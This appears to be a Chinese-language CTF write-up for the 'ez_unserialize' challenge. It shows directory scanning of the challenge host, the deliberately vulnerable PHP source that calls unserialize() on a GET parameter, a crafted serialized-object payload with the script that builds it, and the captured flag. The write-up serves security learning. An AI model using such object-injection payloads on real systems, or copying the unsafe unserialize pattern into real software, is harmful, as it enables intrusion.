---
title: '[SWPUCTF 2021 新生赛]ez_unserialize'
date: '2025-05-26T21:26:56+08:00'
weight: 
draft: false
description: '[SWPUCTF 2021 新生赛]ez_unserialize'
---

使用 `dirsearch` 扫描目录，发现 `flag.php` 和 `robots.txt`

```shell

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: C:\Users\puppy\Desktop\dirsearch-0.4.3\reports\http_node7.anna.nssctf.cn_23250\__25-05-26_21-29-29.txt

Target: http://node7.anna.nssctf.cn:23250/

[21:29:29] Starting:
[21:29:43] 403 -  309B  - /.ht_wsr.txt
[21:29:43] 403 -  312B  - /.htaccess.bak1
[21:29:43] 403 -  310B  - /.htaccessBAK
[21:29:43] 403 -  310B  - /.htaccessOLD
[21:29:43] 403 -  312B  - /.htaccess_orig
[21:29:43] 403 -  311B  - /.htaccessOLD2
[21:29:43] 403 -  314B  - /.htaccess.sample
[21:29:43] 403 -  312B  - /.htaccess.save
[21:29:43] 403 -  303B  - /.html
[21:29:43] 403 -  310B  - /.htaccess_sc
[21:29:43] 403 -  312B  - /.htaccess.orig
[21:29:43] 403 -  308B  - /.htpasswds
[21:29:43] 403 -  312B  - /.htpasswd_test
[21:29:43] 403 -  313B  - /.htaccess_extra
[21:29:43] 403 -  302B  - /.htm
[21:29:43] 403 -  309B  - /.httr-oauth
[21:30:42] 200 -    0B  - /flag.php
[21:31:04] 200 -   35B  - /robots.txt
[21:31:05] 403 -  312B  - /server-status/
[21:31:05] 403 -  311B  - /server-status

Task Completed
```

访问 `robots.txt`

```text
User-agent: *
Disallow: /cl45s.php
```

访问 `cl45s.php`，查看代码：

```php
<?php

error_reporting(0);
show_source("cl45s.php");

class wllm{

    public $admin;
    public $passwd;

    public function __construct(){
        $this->admin ="user";
        $this->passwd = "123456";
    }

        public function __destruct(){
        if($this->admin === "admin" && $this->passwd === "ctf"){
            include("flag.php");
            echo $flag;
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo "Just a bit more!";
        }
    }
}

$p = $_GET['p'];
unserialize($p);

?>
```

构造 payload：`O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}`

```php
<?php

class wllm{
    public $admin;
    public $passwd;

}

$p = new wllm();
$p->admin = "admin";
$p->passwd = "ctf";
echo serialize($p);
```

得到 flag：`NSSCTF{2e018418-f2ee-4c5b-badb-ac9a3c4f297e}`